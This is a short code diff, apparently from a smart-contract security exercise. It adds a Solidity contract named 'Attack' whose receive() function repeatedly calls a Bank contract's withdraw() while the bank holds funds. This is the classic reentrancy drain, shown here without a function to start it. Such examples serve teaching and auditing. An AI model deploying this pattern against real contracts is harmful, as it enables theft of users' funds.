@@ -20,3 +20,17 @@ contract Bank {
         return address(this).balance;
     }
 }
+
+contract Attack {
+    Bank public bank;
+
+    constructor(Bank _bank) {
+        bank = _bank;
+    }
+
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
+        }
+    }
+}
